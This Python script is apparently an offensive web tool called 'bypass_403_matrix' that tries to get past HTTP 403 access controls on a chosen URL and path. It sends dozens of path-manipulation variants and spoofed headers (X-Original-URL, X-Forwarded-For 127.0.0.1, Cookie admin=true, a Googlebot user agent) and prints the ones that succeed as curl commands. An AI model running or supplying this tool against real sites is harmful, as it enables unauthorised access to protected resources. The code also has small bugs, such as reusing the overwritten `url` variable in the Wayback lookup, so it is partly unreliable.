import requests
import pyfiglet
import sys
import json
from urllib3.exceptions import InsecureRequestWarning
import urllib3
from colorama import init, Fore
from termcolor import colored

# Suppress only the single InsecureRequestWarning from urllib3 needed for this program
urllib3.disable_warnings(InsecureRequestWarning)

init(autoreset=True)  # Initialize colorama

def print_header():
    # Display a matrix-like header
    matrix_header = pyfiglet.figlet_format("MATRIX")
    print(colored(matrix_header, 'green'))
    # Display Ashanet in a fancy way
    fancy_ashanet = pyfiglet.figlet_format("Ashanet")
    print(colored(fancy_ashanet, 'cyan'))

def print_banner():
    banner_text = "By Mr Ashanet"
    banner = pyfiglet.figlet_format(banner_text, font="slant")
    rgb_banner = ""
    colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
    for i, line in enumerate(banner.split("\n")):
        color = colors[i % len(colors)]
        rgb_banner += colored(line, color) + "\n"
    print(rgb_banner)

def bypass_403(url, path):
    if not url.startswith(('http://', 'https://')):
        print("Error: URL must start with 'http://' or 'https://'")
        return

    endpoints = [
        (f"{url}/{path}", "GET"),
        (f"{url}/%2e/{path}", "GET"),
        (f"{url}/{path}/.", "GET"),
        (f"{url}//{path}//", "GET"),
        (f"{url}/./{path}/./", "GET"),
        (f"{url}/{path}", "GET", {"X-Original-URL": path}),
        (f"{url}/{path}", "GET", {"X-Custom-IP-Authorization": "127.0.0.1"}),
        (f"{url}/{path}", "GET", {"X-Forwarded-For": "http://127.0.0.1"}),
        (f"{url}/{path}", "GET", {"X-Forwarded-For": "127.0.0.1:80"}),
        (url, "GET", {"X-rewrite-url": path}),
        (f"{url}/{path}%20", "GET"),
        (f"{url}/{path}%09", "GET"),
        (f"{url}/{path}?", "GET"),
        (f"{url}/{path}.html", "GET"),
        (f"{url}/{path}/?anything", "GET"),
        (f"{url}/{path}#", "GET"),
        (f"{url}/{path}", "POST", {}, "Content-Length: 0"),
        (f"{url}/{path}/*", "GET"),
        (f"{url}/{path}.php", "GET"),
        (f"{url}/{path}.json", "GET"),
        (f"{url}/{path}", "TRACE"),
        (f"{url}/{path}", "GET", {"X-Host": "127.0.0.1"}),
        (f"{url}/{path}..;/", "GET"),
        (f"{url}/{path};/", "GET"),
        (f"{url}/{path}", "OPTIONS"),
        (f"{url}/{path}", "HEAD"),
        (f"{url}/{path}/..%00", "GET"),
        (f"{url}/{path}/..%0d%0a", "GET"),
        (f"{url}/{path}/..%2e%2e", "GET"),
        (f"{url}/{path}", "GET", {"Referer": "http://localhost"}),
        (f"{url}/{path}", "GET", {"User-Agent": "Googlebot"}),
        (f"{url}/{path}", "GET", {"Accept": "application/json"}),
        (f"{url}/{path}", "GET", {"Accept-Language": "en-US,en;q=0.9"}),
        (f"{url}/{path}", "GET", {"Cookie": "admin=true"}),

        # LiteSpeed specific methods
        (f"{url}/{path}", "GET", {"X-LiteSpeed-Tag": "test"}),
        (f"{url}/{path}", "GET", {"X-LiteSpeed-Purge": "test"}),
        (f"{url}/{path}", "GET", {"X-LiteSpeed-Purge-Cache": "test"}),

        # Apache specific methods
        (f"{url}/{path}", "GET", {"X-HTTP-Method-Override": "GET"}),
        (f"{url}/{path}", "GET", {"X-Forwarded-Host": "127.0.0.1"}),
        (f"{url}/{path}", "GET", {"X-Forwarded-Proto": "https"}),
        (f"{url}/{path}", "GET", {"X-Original-Host": "127.0.0.1"}),

        # Nginx specific methods
        (f"{url}/{path}", "GET", {"X-Real-IP": "127.0.0.1"}),
        (f"{url}/{path}", "GET", {"X-Accel-Redirect": path}),
        (f"{url}/{path}", "GET", {"X-Accel-Buffering": "no"}),
        (f"{url}/{path}", "GET", {"X-Accel-Charset": "utf-8"}),
    ]

    successful_endpoints = []

    for endpoint in endpoints:
        url, method = endpoint[:2]
        headers = endpoint[2] if len(endpoint) > 2 else {}
        data = endpoint[3] if len(endpoint) > 3 else None

        try:
            response = requests.request(method, url, headers=headers, data=data, verify=False)
            status_info = f"{response.status_code},{len(response.content)}"
            if response.status_code in [200, 201, 202, 204]:
                print(Fore.GREEN + f"  --> {url} - {status_info}")
                successful_endpoints.append((url, method, headers, data))
            else:
                print(f"  --> {url} - {status_info}")
        except requests.RequestException as e:
            print(f"  --> {url} - Request failed: {e}")

    print("\nSuccessful endpoints:")
    for endpoint in successful_endpoints:
        url, method, headers, data = endpoint
        headers_str = ' '.join([f"-H '{k}: {v}'" for k, v in headers.items()]) if headers else ""
        data_str = f"--data '{data}'" if data else ""
        print(Fore.GREEN + f"URL: {url}")
        print(Fore.GREEN + f"Method: {method}")
        print(Fore.GREEN + f"Curl: curl -X {method} {headers_str} {data_str} {url}")
        print("-" * 60)

    print("\nWayback Machine:")
    wayback_url = f"https://archive.org/wayback/available?url={url}/{path}"
    wayback_response = requests.get(wayback_url)
    wayback_data = wayback_response.json()

    if 'archived_snapshots' in wayback_data and 'closest' in wayback_data['archived_snapshots']:
        print(json.dumps(wayback_data['archived_snapshots']['closest'], indent=2))
    else:
        print("No archived snapshots found for this URL.")

if __name__ == "__main__":
    print_header()
    print_banner()

    if len(sys.argv) != 3:
        print("Usage: python bypass_403_matrix.py <url> <path>")
        sys.exit(1)

    bypass_403(sys.argv[1], sys.argv[2])
